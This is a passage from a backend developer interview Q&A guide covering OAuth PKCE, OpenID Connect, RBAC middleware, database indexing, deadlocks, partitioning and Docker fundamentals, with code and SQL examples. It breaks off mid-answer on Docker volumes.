  return { verifier, challenge };
}

// In the browser/client
const { verifier, challenge } = generatePKCE();
sessionStorage.setItem('pkce_verifier', verifier); // store verifier

const authUrl = `https://auth.server.com/auth
  ?client_id=${CLIENT_ID}
  &redirect_uri=${REDIRECT_URI}
  &response_type=code
  &code_challenge=${challenge}
  &code_challenge_method=S256`;

window.location.href = authUrl;

// On callback:
const verifier = sessionStorage.getItem('pkce_verifier');
const response = await fetch('/auth/token', {
  method: 'POST',
  body: JSON.stringify({ code, code_verifier: verifier })
});
```

> 📖 Reference: [PKCE — Auth0](https://auth0.com/docs/get-started/authentication-and-authorization-flow/authorization-code-flow-with-pkce)

---

**Q15. What is OpenID Connect (OIDC)? How does it differ from OAuth 2.0?**

**Answer:**

| | OAuth 2.0 | OpenID Connect (OIDC) |
|--|-----------|----------------------|
| Purpose | **Authorization** — grant access to resources | **Authentication** — verify WHO the user is |
| Answers | "Can this app access these resources?" | "Who is this user?" |
| Returns | Access token | Access token + **ID token (JWT with user info)** |
| User info | Not specified | Standardized `/userinfo` endpoint + `id_token` |
| Built on | Protocol spec | Built ON TOP of OAuth 2.0 |

**Analogy:**
- OAuth 2.0 = Hotel key card (gives access to a room, but doesn't prove who you are)
- OIDC = Passport (proves your identity)

**ID Token example (OIDC-specific):**

```json
// JWT decoded:
{
  "iss": "https://accounts.google.com",  // issuer
  "sub": "110169484474386276334",         // unique user ID (stable)
  "aud": "your-client-id",               // your app
  "exp": 1716003600,
  "iat": 1716000000,
  "email": "alice@gmail.com",
  "email_verified": true,
  "name": "Alice Smith",
  "picture": "https://lh3.googleusercontent.com/...",
  "given_name": "Alice",
  "family_name": "Smith",
  "locale": "en"
}
// This is authentication — you know WHO the user is, verified by Google
```

```js
// OIDC: verify ID token and extract user identity
const { OAuth2Client } = require('google-auth-library');
const googleClient = new OAuth2Client(process.env.GOOGLE_CLIENT_ID);

app.post('/auth/google/verify', async (req, res) => {
  const { idToken } = req.body;

  // Verify the ID token (signature, expiry, audience)
  const ticket = await googleClient.verifyIdToken({
    idToken,
    audience: process.env.GOOGLE_CLIENT_ID
  });

  const payload = ticket.getPayload();
  // payload.sub = stable unique Google user ID
  // payload.email = alice@gmail.com
  // payload.email_verified = true
  // payload.name = "Alice Smith"

  const user = await User.findOrCreate({ googleId: payload.sub, email: payload.email });
  const jwt = signAppJwt({ userId: user.id });
  res.json({ token: jwt });
});
```

> 📖 Reference: [OIDC vs OAuth — Okta](https://developer.okta.com/blog/2019/10/21/illustrated-guide-to-oauth-and-oidc)

---

**Q16. What is role-based access control (RBAC)? How would you implement it in a REST API?**

**Answer:**

**RBAC** assigns permissions to roles rather than individual users. Users are assigned roles, and roles have permissions.

```
Users → Roles → Permissions

alice  → admin  → can: read_users, write_users, delete_users, read_orders, write_orders
bob    → editor → can: read_users, write_orders
carol  → viewer → can: read_users, read_orders
```

**Full implementation:**

```js
// ── Database schema ──────────────────────────────────────────────────
// users:       id, name, email, role_id
// roles:       id, name (admin, editor, viewer)
// permissions: id, name (read_users, write_users, delete_users, ...)
// role_permissions: role_id, permission_id

// ── Embed role + permissions in JWT at login ─────────────────────────
app.post('/login', async (req, res) => {
  const user = await validateCredentials(req.body);
  const role = await getRoleWithPermissions(user.role_id);
  // role = { name: 'admin', permissions: ['read_users', 'write_users', 'delete_users'] }

  const token = jwt.sign(
    {
      userId: user.id,
      role:   role.name,
      permissions: role.permissions
    },
    process.env.JWT_SECRET,
    { expiresIn: '15m' }
  );
  res.json({ token });
});

// ── RBAC middleware factory ──────────────────────────────────────────
const requirePermission = (permission) => (req, res, next) => {
  const { permissions } = req.user; // set by auth middleware
  if (!permissions.includes(permission)) {
    return res.status(403).json({
      error: 'Forbidden',
      required: permission,
      message: `You need '${permission}' permission to access this resource`
    });
  }
  next();
};

const requireRole = (...roles) => (req, res, next) => {
  if (!roles.includes(req.user.role)) {
    return res.status(403).json({ error: 'Forbidden', required: roles });
  }
  next();
};

// ── Apply to routes ──────────────────────────────────────────────────
// Anyone authenticated
app.get('/profile',         requireAuth, getProfile);

// Only admins
app.get('/admin/users',     requireAuth, requireRole('admin'), listAllUsers);

// Permission-based (more flexible than role-based)
app.get('/users',           requireAuth, requirePermission('read_users'),   listUsers);
app.post('/users',          requireAuth, requirePermission('write_users'),  createUser);
app.delete('/users/:id',    requireAuth, requirePermission('delete_users'), deleteUser);
app.get('/orders',          requireAuth, requirePermission('read_orders'),  listOrders);

// ── Usage example ────────────────────────────────────────────────────
// alice (admin) → GET /users → 200 OK ✅
// carol (viewer) → DELETE /users/5 → 403 Forbidden ✅

// ── Resource-level RBAC (can only edit own resources) ────────────────
app.patch('/posts/:id', requireAuth, async (req, res) => {
  const post = await Post.findById(req.params.id);

  const canEdit = req.user.role === 'admin'
    || post.authorId === req.user.userId;   // owner can always edit their own

  if (!canEdit) {
    return res.status(403).json({ error: 'You can only edit your own posts' });
  }

  const updated = await Post.update(req.params.id, req.body);
  res.json(updated);
});
```

> 📖 Reference: [RBAC — Auth0](https://auth0.com/docs/manage-users/access-control/rbac)

---

## 3. Database Indexing & Query Optimization

---

**Q17. What is a composite index? When should you use one vs a single-column index?**

**Answer:**

A **composite index** (multi-column index) indexes two or more columns together as a single index entry.

```sql
-- Single-column indexes (separate)
CREATE INDEX idx_users_email  ON users(email);
CREATE INDEX idx_users_status ON users(status);

-- Composite index (together)
CREATE INDEX idx_users_status_email ON users(status, email);
```

**The Left-Prefix Rule:** A composite index on `(status, email)` can be used for:
- Queries on `status` alone ✅
- Queries on `status` AND `email` together ✅
- Queries on `email` alone ❌ (right-side column without left-side can't use the index)

```sql
-- Composite index: (status, email, created_at)

-- ✅ Uses index
SELECT * FROM users WHERE status = 'active';
SELECT * FROM users WHERE status = 'active' AND email = 'a@b.com';
SELECT * FROM users WHERE status = 'active' AND email = 'a@b.com' AND created_at > '2024-01-01';

-- ❌ Cannot use composite index (skips leftmost column)
SELECT * FROM users WHERE email = 'a@b.com';
SELECT * FROM users WHERE created_at > '2024-01-01';
```

**Real-world decision guide:**

```sql
-- Use SINGLE index when queries only filter by one column
SELECT * FROM users WHERE email = ?;
→ CREATE INDEX idx_email ON users(email);

-- Use COMPOSITE index when you frequently query by multiple columns together
-- AND the combination has better selectivity
SELECT * FROM orders WHERE user_id = ? AND status = ? ORDER BY created_at DESC;
→ CREATE INDEX idx_orders_user_status_date ON orders(user_id, status, created_at);
-- Order matters: put = conditions first, range conditions last

-- Rule of thumb: order columns by selectivity (most selective first)
-- AND by how they appear in your most common WHERE clauses
```

> 📖 Reference: [Composite Indexes — Use The Index Luke](https://use-the-index-luke.com/sql/where-clause/the-equals-operator/concatenated-keys)

---

**Q18. What is a covering index? How can it eliminate table lookups?**

**Answer:**

A **covering index** is an index that contains all the columns a query needs — so the database can satisfy the entire query from the index alone, without ever touching the main table (heap).

```sql
-- Table: orders(id, user_id, status, total, created_at, shipping_address, notes, ...)

-- ❌ Non-covering: index has user_id, but query also needs status and total
CREATE INDEX idx_orders_user ON orders(user_id);

EXPLAIN SELECT user_id, status, total
FROM orders WHERE user_id = 42;
-- Plan: Index Scan → for each matching row, go back to heap to get status and total
-- Extra: "Using index condition" ← heap lookups happening

-- ✅ Covering index: includes ALL columns the query needs
CREATE INDEX idx_orders_covering ON orders(user_id, status, total);

EXPLAIN SELECT user_id, status, total
FROM orders WHERE user_id = 42;
-- Plan: Index Only Scan
-- Extra: "Using index" ← no heap lookup needed! ✅
-- Much faster for read-heavy workloads
```

**PostgreSQL example:**

```sql
-- Query: list all active orders for a user with just the essential fields
SELECT id, status, total, created_at
FROM orders
WHERE user_id = 42 AND status = 'active'
ORDER BY created_at DESC;

-- Covering index for this query:
CREATE INDEX idx_orders_user_status_covering
ON orders(user_id, status, created_at DESC)
INCLUDE (id, total);  -- INCLUDE = store extra columns but don't sort by them (PostgreSQL 11+)

-- Now EXPLAIN shows: Index Only Scan ← reads index only, no table access
```

**Trade-off:** Covering indexes are larger and slower to write (since more data is in the index). Only add them for queries that are demonstrably slow and run very frequently.

> 📖 Reference: [Covering Index — Use The Index Luke](https://use-the-index-luke.com/sql/clustering/index-only-scan-covering-index)

---

**Q19. What is a full-text search index? How is it different from a LIKE query?**

**Answer:**

| | `LIKE '%keyword%'` | Full-Text Search |
|--|-------------------|-----------------|
| Index used | ❌ No (leading wildcard defeats index) | ✅ Yes (inverted index) |
| Performance | O(n) — full table scan | O(log n) — index lookup |
| Relevance ranking | ❌ No | ✅ Yes (TF-IDF ranking) |
| Stemming | ❌ No ("run" ≠ "running") | ✅ Yes |
| Stop words | ❌ No | ✅ Yes ("the", "is" ignored) |
| Typo tolerance | ❌ No | Sometimes (with fuzzy search) |

**PostgreSQL full-text search example:**

```sql
-- Setup
ALTER TABLE articles ADD COLUMN search_vector tsvector;

-- Generate search vector (tokenized, stemmed, weighted)
UPDATE articles
SET search_vector = to_tsvector('english', title || ' ' || body);

-- Create GIN index for fast full-text lookups
CREATE INDEX idx_articles_fts ON articles USING GIN(search_vector);

-- Triggered update on insert/update
CREATE TRIGGER update_search_vector
BEFORE INSERT OR UPDATE ON articles
FOR EACH ROW EXECUTE FUNCTION
  tsvector_update_trigger(search_vector, 'pg_catalog.english', title, body);

-- Query: search for articles about "database performance"
SELECT id, title,
  ts_rank(search_vector, query) AS rank  -- relevance score
FROM articles, to_tsquery('english', 'database & performance') query
WHERE search_vector @@ query
ORDER BY rank DESC
LIMIT 10;

-- ✅ "database performance" matches:
--   "Improving Database Performance" (stemmed: databas, perform)
--   "Performance tuning for databases" ← stemming handles "databases" → "databas"

-- ❌ LIKE equivalent (don't use for text search):
SELECT * FROM articles WHERE body LIKE '%database performance%';
-- Full table scan, no ranking, misses "databases", "performing"
```

**When to use Elasticsearch instead of DB full-text search:**
- Very large datasets (millions of articles).
- Complex search features (facets, autocomplete, typo tolerance).
- Full-text search is the core feature, not secondary.

> 📖 Reference: [Full-Text Search — PostgreSQL Docs](https://www.postgresql.org/docs/current/textsearch.html)

---

**Q20. What is query caching at the database level? How is it different from application-level caching?**

**Answer:**

**DB-level query cache** (e.g., MySQL query cache): The DB engine caches the exact result of a SQL query string. If the exact same query is run again and the underlying tables haven't changed, it returns the cached result.

**Application-level caching** (Redis/Memcached): Your code explicitly stores and retrieves query results in an external cache.

```
DB-level caching:
App → SQL query → DB checks cache → HIT: return cached result
                                  → MISS: execute query → cache result → return

Application-level caching:
App → check Redis → HIT: return cached data (no DB involved)
                  → MISS → run SQL → store in Redis → return
```

**Key differences:**

| | DB Query Cache | Application-Level Cache (Redis) |
|--|--------------|-------------------------------|
| Transparency | Automatic — DB handles it | Manual — developer writes cache logic |
| Granularity | Per exact SQL string | Per business object / any key |
| Flexibility | None | Full control (TTL, invalidation, data transformation) |
| Cross-service | No | Yes — all microservices can share Redis |
| Status | MySQL 8.0 removed it! | Actively used everywhere |
| Recommended? | ❌ No longer | ✅ Yes |

**Why MySQL removed its query cache:**
- It was a global lock bottleneck at scale.
- Invalidated entirely when ANY row in the table changes (too aggressive).
- Application-level caching (Redis) is far more effective and flexible.

```js
// ✅ Application-level cache — what you should actually use
async function getProductsByCategory(categoryId) {
  const cacheKey = `products:category:${categoryId}`;

  const cached = await redis.get(cacheKey);
  if (cached) return JSON.parse(cached);

  const products = await db.query(
    'SELECT * FROM products WHERE category_id = ? AND active = 1',
    [categoryId]
  );

  await redis.setex(cacheKey, 300, JSON.stringify(products));
  return products;
}
```

> 📖 Reference: [DB Query Cache — MySQL Docs](https://dev.mysql.com/doc/refman/8.0/en/query-cache.html)

---

**Q21. What is a database deadlock at the query level? How do you detect and resolve it?**

**Answer:**

A **deadlock** at the database level occurs when two transactions each hold a lock the other needs, creating a circular wait. The DB detects this and kills one transaction (the "victim").

```
Transaction A:                  Transaction B:
LOCK ROW orders#1              LOCK ROW orders#2
... (doing work) ...            ... (doing work) ...
WAIT for orders#2 ←←←←←←←→→→→ WAIT for orders#1
       ↑                               ↓
       └──────── DEADLOCK ─────────────┘

DB kills one transaction → it receives: ERROR: deadlock detected
```

**Real example:**

```sql
-- Transaction A: Transfer from account 1 to account 2
BEGIN;
UPDATE accounts SET balance = balance - 100 WHERE id = 1; -- locks row 1
UPDATE accounts SET balance = balance + 100 WHERE id = 2; -- waits for row 2

-- Transaction B: Transfer from account 2 to account 1 (simultaneous)
BEGIN;
UPDATE accounts SET balance = balance - 50 WHERE id = 2;  -- locks row 2
UPDATE accounts SET balance = balance + 50 WHERE id = 1;  -- waits for row 1 → DEADLOCK
```

**Detection:**

```sql
-- PostgreSQL: view current locks
SELECT pid, query, wait_event_type, wait_event, state
FROM pg_stat_activity
WHERE wait_event_type = 'Lock';

-- Enable deadlock logging
-- postgresql.conf:
log_lock_waits = on
deadlock_timeout = 1s
```

**Resolution strategies:**

```js
// ── Fix 1: Consistent lock ordering (best prevention) ────────────────
// Always lock accounts in the same order (smaller ID first)
async function transferMoney(fromId, toId, amount) {
  const [firstId, secondId] = fromId < toId
    ? [fromId, toId]
    : [toId, fromId];

  await db.query('BEGIN');
  await db.query('SELECT * FROM accounts WHERE id = ? FOR UPDATE', [firstId]);
  await db.query('SELECT * FROM accounts WHERE id = ? FOR UPDATE', [secondId]);

  await db.query('UPDATE accounts SET balance = balance - ? WHERE id = ?', [amount, fromId]);
  await db.query('UPDATE accounts SET balance = balance + ? WHERE id = ?', [amount, toId]);
  await db.query('COMMIT');
}
// Both transactions always lock the smaller ID first → no circular wait

// ── Fix 2: Retry on deadlock ──────────────────────────────────────────
async function withRetry(fn, maxRetries = 3) {
  for (let attempt = 1; attempt <= maxRetries; attempt++) {
    try {
      return await fn();
    } catch (err) {
      if (err.code === '40P01' && attempt < maxRetries) { // PostgreSQL deadlock code
        const backoff = Math.pow(2, attempt) * 10; // 20ms, 40ms, 80ms
        await new Promise(r => setTimeout(r, backoff));
        continue;
      }
      throw err;
    }
  }
}

await withRetry(() => transferMoney(1, 2, 100));
```

> 📖 Reference: [Deadlocks — PostgreSQL Docs](https://www.postgresql.org/docs/current/explicit-locking.html#LOCKING-DEADLOCKS)

---

**Q22. What is the difference between a clustered index and a non-clustered index?**

**Answer:**

| | Clustered Index | Non-Clustered Index |
|--|----------------|---------------------|
| Data storage | Index IS the table — rows physically ordered by index key | Separate structure — points to the actual row |
| Count per table | Max 1 (it defines physical order) | Many (limited by DB, typically ~999) |
| Read performance | Fast for range scans (rows are adjacent on disk) | Requires "bookmark lookup" to fetch actual row |
| Write performance | Slower (page splits when inserting out of order) | Faster inserts (no physical reordering) |
| Default | Usually primary key becomes clustered index | All other indexes |

**Visual:**

```
Clustered Index (Primary Key = id):
Physical disk pages:
Page 1: [row id=1][row id=2][row id=3][row id=4]
Page 2: [row id=5][row id=6][row id=7][row id=8]
→ SELECT * FROM users WHERE id BETWEEN 3 AND 6 reads 2 contiguous pages ✅

Non-Clustered Index (on email):
Index B-Tree:
  alice@... → pointer to Page 3, Row 12
  bob@...   → pointer to Page 1, Row 2
  carol@... → pointer to Page 7, Row 45
→ Each email lookup = index scan + heap fetch (extra I/O)
```

**PostgreSQL note:** PostgreSQL uses **heaps** — all indexes are non-clustered by default. You can use `CLUSTER` command to physically reorder once, but it's not maintained automatically. Use a **Brin index** for naturally ordered data (timestamps).

**SQL Server / MySQL InnoDB:** Primary key is always clustered — choose it wisely (UUID as PK = random inserts = page splits = slower writes).

```sql
-- ✅ Good clustered key: sequential, narrow
CREATE TABLE orders (
  id BIGINT AUTO_INCREMENT PRIMARY KEY, -- clustered in InnoDB, sequential = fast inserts
  ...
);

-- ❌ Bad clustered key: UUID is random, causes page splits
CREATE TABLE orders (
  id UUID DEFAULT gen_random_uuid() PRIMARY KEY, -- random = fragmentation
  ...
);
```

> 📖 Reference: [Clustered vs Non-Clustered Index — GeeksForGeeks](https://www.geeksforgeeks.org/difference-between-clustered-and-non-clustered-index/)

---

**Q23. How do you identify slow queries in production? What tools or techniques do you use?**

**Answer:**

**Step 1 — Enable slow query logging:**

```sql
-- PostgreSQL: postgresql.conf
log_min_duration_statement = 500   -- log queries slower than 500ms
log_duration = on
log_statement = 'all'              -- or 'ddl', 'mod', 'none'

-- MySQL: my.cnf
slow_query_log = 1
long_query_time = 0.5
slow_query_log_file = /var/log/mysql/slow.log
log_queries_not_using_indexes = 1
```

**Step 2 — Analyze slow query log:**

```bash
# MySQL: use pt-query-digest (Percona Toolkit)
pt-query-digest /var/log/mysql/slow.log | head -100
# Shows: query count, total time, avg time, worst queries

# PostgreSQL: use pgBadger
pgbadger /var/log/postgresql/postgresql.log -o report.html
# Beautiful HTML report with top slow queries, lock waits, errors
```

**Step 3 — Check pg_stat_statements (PostgreSQL):**

```sql
-- Enable extension
CREATE EXTENSION IF NOT EXISTS pg_stat_statements;

-- Top 10 slowest queries by total time
SELECT
  query,
  calls,
  total_exec_time / 1000 AS total_sec,
  mean_exec_time / 1000  AS avg_sec,
  rows,
  100.0 * shared_blks_hit / nullif(shared_blks_hit + shared_blks_read, 0) AS cache_hit_pct
FROM pg_stat_statements
ORDER BY total_exec_time DESC
LIMIT 10;

-- Queries causing the most I/O
SELECT query, shared_blks_read + shared_blks_written AS total_io
FROM pg_stat_statements
ORDER BY total_io DESC
LIMIT 10;
```

**Step 4 — EXPLAIN ANALYZE the slow query:**

```sql
EXPLAIN (ANALYZE, BUFFERS, FORMAT TEXT)
SELECT u.name, COUNT(o.id) as order_count
FROM users u
JOIN orders o ON u.id = o.user_id
WHERE u.created_at > NOW() - INTERVAL '30 days'
GROUP BY u.id
ORDER BY order_count DESC
LIMIT 20;

-- Look for:
-- Seq Scan on large table → add index
-- Hash Join with large hash → may need index on join column
-- "Rows Removed by Filter: 99999" → index not filtering well
-- high "Buffers: shared hit=0 read=50000" → poor cache hit rate
```

**APM tools for production:**
- **Datadog / New Relic / Dynatrace** — auto-capture slow queries, show flamegraphs, correlate with traces.
- **PgHero / Adminer** — lightweight DB dashboards.
- **Scout APM** — good for Rails/Django apps.

> 📖 Reference: [Slow Query Log — MySQL Docs](https://dev.mysql.com/doc/refman/8.0/en/slow-query-log.html)

---

**Q24. What is database partitioning? What is the difference between horizontal and vertical partitioning?**

**Answer:**

**Partitioning** splits a large table into smaller, more manageable pieces to improve query performance, maintenance, and scalability.

**Horizontal Partitioning (Sharding):** Split rows across partitions based on a partition key.

```sql
-- PostgreSQL: partition orders by year (range partitioning)
CREATE TABLE orders (
  id         BIGSERIAL,
  user_id    INT,
  total      DECIMAL,
  created_at TIMESTAMP
) PARTITION BY RANGE (created_at);

-- Create yearly partitions
CREATE TABLE orders_2022 PARTITION OF orders
  FOR VALUES FROM ('2022-01-01') TO ('2023-01-01');

CREATE TABLE orders_2023 PARTITION OF orders
  FOR VALUES FROM ('2023-01-01') TO ('2024-01-01');

CREATE TABLE orders_2024 PARTITION OF orders
  FOR VALUES FROM ('2024-01-01') TO ('2025-01-01');

-- Query automatically targets only the 2024 partition (partition pruning)
SELECT * FROM orders WHERE created_at >= '2024-01-01';
-- Only scans orders_2024, not 2022 or 2023 ✅

-- Hash partitioning (by user_id — distribute evenly)
CREATE TABLE users PARTITION BY HASH (id);
CREATE TABLE users_0 PARTITION OF users FOR VALUES WITH (MODULUS 4, REMAINDER 0);
CREATE TABLE users_1 PARTITION OF users FOR VALUES WITH (MODULUS 4, REMAINDER 1);
CREATE TABLE users_2 PARTITION OF users FOR VALUES WITH (MODULUS 4, REMAINDER 2);
CREATE TABLE users_3 PARTITION OF users FOR VALUES WITH (MODULUS 4, REMAINDER 3);
```

**Vertical Partitioning:** Split columns across tables based on access patterns.

```sql
-- ❌ All columns in one table (cold columns slow down hot queries)
CREATE TABLE users (
  id           INT PRIMARY KEY,
  email        VARCHAR(255),   -- hot: accessed on every login
  name         VARCHAR(100),   -- hot: displayed everywhere
  avatar_url   TEXT,           -- medium: accessed on profile views
  bio          TEXT,           -- cold: rarely accessed
  preferences  JSONB,          -- cold: only on settings page
  last_login   TIMESTAMP       -- medium
);

-- ✅ Vertically partitioned
CREATE TABLE users (            -- hot columns — small row = more rows per page
  id    INT PRIMARY KEY,
  email VARCHAR(255),
  name  VARCHAR(100),
  last_login TIMESTAMP
);

CREATE TABLE user_profiles (    -- cold columns — separate table, JOIN only when needed
  user_id    INT PRIMARY KEY REFERENCES users(id),
  bio        TEXT,
  preferences JSONB,
  avatar_url TEXT
);
```

> 📖 Reference: [DB Partitioning — AWS](https://aws.amazon.com/what-is/database-sharding/)

---

## 4. Docker & Containerization

---

**Q25. What is a Docker container? How is it different from a virtual machine?**

**Answer:**

| | Container | Virtual Machine |
|--|-----------|----------------|
| What it virtualizes | OS process isolation | Entire hardware (CPU, RAM, disk) |
| Startup time | Milliseconds | Minutes |
| Size | MBs | GBs |
| OS | Shares host OS kernel | Own full OS kernel |
| Isolation | Process-level | Hardware-level |
| Performance overhead | Minimal (~1%) | Significant (~5–20%) |
| Use case | App packaging, microservices | Full OS isolation, legacy apps |

```
Virtual Machine:                    Container:
┌─────────────────────────┐        ┌─────────────────────────┐
│  App A    │  App B      │        │  App A    │  App B      │
│  Libs     │  Libs       │        │  Libs     │  Libs       │
│  Guest OS │  Guest OS   │        ├───────────────────────── │
│  (Ubuntu) │  (CentOS)   │        │     Docker Engine        │
├───────────────────────── │        │     Host OS Kernel       │
│   Hypervisor (VMware)   │        ├─────────────────────────┤
│   Host OS               │        │   Host Hardware          │
│   Hardware              │        └─────────────────────────┘
└─────────────────────────┘
Each VM: 2GB+ RAM,              Each container: 50MB, starts
starts in 1-2 minutes           in <1 second, shares kernel
```

**Containers use Linux kernel features:**
- **Namespaces** — isolate processes, networking, filesystem.
- **cgroups** — limit CPU, memory, I/O per container.
- **Union filesystems** — layers shared between containers.

> 📖 Reference: [Containers vs VMs — Docker Docs](https://www.docker.com/resources/what-container/)

---

**Q26. What is a Dockerfile? Explain common instructions: `FROM`, `RUN`, `COPY`, `CMD`, `EXPOSE`, `ENV`.**

**Answer:**

A **Dockerfile** is a text file of instructions that Docker reads to build an image layer by layer.

```dockerfile
# ── FROM: base image (always first) ─────────────────────────────────
FROM node:20-alpine
# node:20-alpine = Node.js 20 on Alpine Linux (~5MB vs Ubuntu's ~70MB)
# Always pin a specific version — never use 'latest' in production

# ── ENV: set environment variables ───────────────────────────────────
ENV NODE_ENV=production
ENV PORT=3000
# Available at build time AND runtime inside the container

# ── WORKDIR: set working directory ───────────────────────────────────
WORKDIR /app
# Creates /app if it doesn't exist; all subsequent commands run here

# ── COPY: copy files from host into image ────────────────────────────
COPY package.json package-lock.json ./
# Copy package files FIRST (before source code)
# Reason: Docker layer caching — if package files don't change,
# the npm install layer is reused on rebuilds ✅

# ── RUN: execute command during BUILD ────────────────────────────────
RUN npm ci --only=production
# npm ci = faster, reproducible (uses package-lock.json exactly)
# --only=production = skip devDependencies (smaller image)

COPY . .
# Copy rest of source code AFTER npm install
# (source changes don't invalidate the npm install layer)

# ── EXPOSE: document which port the container listens on ─────────────
EXPOSE 3000
# This is documentation only — doesn't actually publish the port
# Port is published with: docker run -p 8080:3000

# ── CMD: default command to run when container starts ────────────────
CMD ["node", "src/index.js"]
# JSON array form (preferred) — no shell interpretation
# Can be overridden: docker run myapp node scripts/migrate.js
```

**Other important instructions:**

```dockerfile
# ENTRYPOINT: like CMD but harder to override — for wrapper scripts
ENTRYPOINT ["./docker-entrypoint.sh"]

# ARG: build-time variable (not available at runtime)
ARG BUILD_VERSION
RUN echo "Building version: $BUILD_VERSION"
# docker build --build-arg BUILD_VERSION=1.2.3 .

# USER: run as non-root user (security best practice)
RUN addgroup -S appgroup && adduser -S appuser -G appgroup
USER appuser

# HEALTHCHECK: define container health check
HEALTHCHECK --interval=30s --timeout=5s --retries=3 \
  CMD wget -qO- http://localhost:3000/health || exit 1
```

> 📖 Reference: [Dockerfile Reference — Docker Docs](https://docs.docker.com/engine/reference/builder/)

---

**Q27. What is a Docker image vs a Docker container? What is a Docker registry?**

**Answer:**

- **Docker Image:** A read-only template — a snapshot of the filesystem and configuration. Think of it as a class definition or a blueprint. Immutable.
- **Docker Container:** A running instance of an image. Think of it as an object instantiated from a class. Has its own writable layer on top of the image layers.
- **Docker Registry:** A storage and distribution service for Docker images (Docker Hub, AWS ECR, GCR, private registries).

```
Analogy:
Image   = Class definition (blueprint)
Container = Object (running instance)
Registry  = npm registry (stores and distributes images)
```

```bash
# ── Working with images ─────────────────────────────────────────────
docker build -t myapp:1.0.0 .       # build image from Dockerfile
docker images                        # list all local images
docker image inspect myapp:1.0.0     # show image metadata and layers
docker image history myapp:1.0.0     # show layers and sizes

# ── Working with containers ─────────────────────────────────────────
docker run -d \                      # -d = detached (background)
  --name my-api \
  -p 8080:3000 \                     # host:container port mapping
  -e DATABASE_URL=postgres://... \   # environment variable
  -e JWT_SECRET=secret \
  myapp:1.0.0

docker ps                            # list running containers
docker ps -a                         # include stopped containers
docker logs my-api                   # view container logs
docker logs my-api -f                # follow (tail) logs
docker exec -it my-api sh            # open shell inside running container
docker stop my-api                   # graceful stop (SIGTERM)
docker rm my-api                     # delete container

# ── Working with registry ────────────────────────────────────────────
docker login                         # authenticate with Docker Hub
docker tag myapp:1.0.0 myuser/myapp:1.0.0   # tag for registry
docker push myuser/myapp:1.0.0       # push to registry

# On another machine:
docker pull myuser/myapp:1.0.0       # pull from registry
docker run myuser/myapp:1.0.0        # run it
```

> 📖 Reference: [Docker Concepts — Docker Docs](https://docs.docker.com/get-started/overview/)

---

**Q28. What is Docker Compose? When would you use it?**

**Answer:**

**Docker Compose** is a tool for defining and running multi-container applications. You describe all services, networks, and volumes in a single `docker-compose.yml` file and start everything with one command.

**When to use it:**
- Local development (run app + DB + Redis + queue together).
- Running integration tests in CI.
- Small deployments (not Kubernetes-scale).

**Complete example for a Node.js API:**

```yaml
# docker-compose.yml
version: '3.9'

services:

  # ── Backend API ───────────────────────────────────────────────────
  api:
    build: .                         # build from Dockerfile in current directory
    container_name: my-api
    ports:
      - "3000:3000"
    environment:
      NODE_ENV:     development
      DATABASE_URL: postgres://postgres:password@db:5432/myapp
      REDIS_URL:    redis://redis:6379
      JWT_SECRET:   dev-secret-change-in-prod
    depends_on:
      db:
        condition: service_healthy   # wait for DB to be ready
      redis:
        condition: service_started
    volumes:
      - .:/app                       # bind mount source code for hot-reload
      - /app/node_modules            # don't override node_modules from host
    command: npm run dev             # override CMD for development

  # ── PostgreSQL ────────────────────────────────────────────────────
  db:
    image: postgres:15-alpine
    container_name: my-db
    ports:
      - "5432:5432"
    environment:
      POSTGRES_DB:       myapp
      POSTGRES_USER:     postgres
      POSTGRES_PASSWORD: password
    volumes:
      - postgres_data:/var/lib/postgresql/data    # persist data across restarts
      - ./db/init.sql:/docker-entrypoint-initdb.d/init.sql  # run on first start
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U postgres"]
      interval: 5s
      timeout: 3s
      retries: 5

  # ── Redis ─────────────────────────────────────────────────────────
  redis:
    image: redis:7-alpine
    container_name: my-redis
    ports:
      - "6379:6379"
    command: redis-server --appendonly yes   # enable persistence
    volumes:
      - redis_data:/data

  # ── Background Worker ─────────────────────────────────────────────
  worker:
    build: .
    container_name: my-worker
    command: node workers/emailWorker.js
    environment:
      DATABASE_URL: postgres://postgres:password@db:5432/myapp
      REDIS_URL:    redis://redis:6379
    depends_on:
      - db
      - redis

volumes:
  postgres_data:
  redis_data:
```

```bash
# Start everything
docker compose up -d

# Start only specific services
docker compose up -d api redis

# View logs from all services
docker compose logs -f

# Run a command in a service
docker compose exec api npm run migrate

# Tear down everything (remove containers + networks)
docker compose down

# Also remove volumes (⚠️ deletes DB data)
docker compose down -v
```

> 📖 Reference: [Docker Compose — Docker Docs](https://docs.docker.com/compose/)

---

**Q29. What is a multi-stage Docker build? Why is it used to reduce image size?**

**Answer:**

A multi-stage build uses multiple `FROM` instructions in one Dockerfile, where each stage can copy artifacts from previous stages. This lets you use heavy build tools (compilers, TypeScript) without shipping them in the final image.

**Without multi-stage (bad):**

```dockerfile
FROM node:20                    # 1.1GB base image
WORKDIR /app
COPY package*.json ./
RUN npm ci                       # includes devDependencies (jest, typescript, etc.)
COPY . .
RUN npm run build                # compile TypeScript
CMD ["node", "dist/index.js"]
# Final image: ~1.2GB 😱
# Contains: TypeScript, ts-node, jest, eslint, ALL dev tools
```

**With multi-stage build (optimized):**

```dockerfile
# ── Stage 1: Builder ─────────────────────────────────────────────────
FROM node:20-alpine AS builder
WORKDIR /app

COPY package*.json ./
RUN npm ci                       # install ALL deps including devDeps

COPY . .
RUN npm run build                # compile TypeScript → dist/
RUN npm run test                 # run tests during build

# ── Stage 2: Production image ────────────────────────────────────────
FROM node:20-alpine AS production
WORKDIR /app

# Only copy what we need from the builder stage
COPY package*.json ./
RUN npm ci --only=production     # install ONLY production deps

COPY --from=builder /app/dist ./dist   # copy compiled code only

# Security: run as non-root
RUN addgroup -S appgroup && adduser -S appuser -G appgroup
USER appuser

EXPOSE 3000
HEALTHCHECK --interval=30s CMD wget -qO- http://localhost:3000/health
CMD ["node", "dist/index.js"]

# Final image: ~180MB ✅ (vs 1.2GB without multi-stage)
# Contains: Node.js runtime + compiled JS + prod dependencies only
# NO TypeScript, jest, source maps, dev tools
```

**Another example — Go (even more dramatic):**

```dockerfile
FROM golang:1.22 AS builder          # 800MB
WORKDIR /app
COPY . .
RUN go build -o server ./cmd/server  # compile to single binary

FROM scratch AS production           # empty image (0MB base!)
COPY --from=builder /app/server /server
EXPOSE 8080
CMD ["/server"]
# Final image: ~10MB (just the binary + SSL certs)
```

> 📖 Reference: [Multi-stage Builds — Docker Docs](https://docs.docker.com/build/building/multi-stage/)

---

**Q30. What are Docker volumes? How do they differ from bind mounts?**

**Answer:**

Both persist data outside a container's writable layer, but they work differently.

| | Volume | Bind Mount |
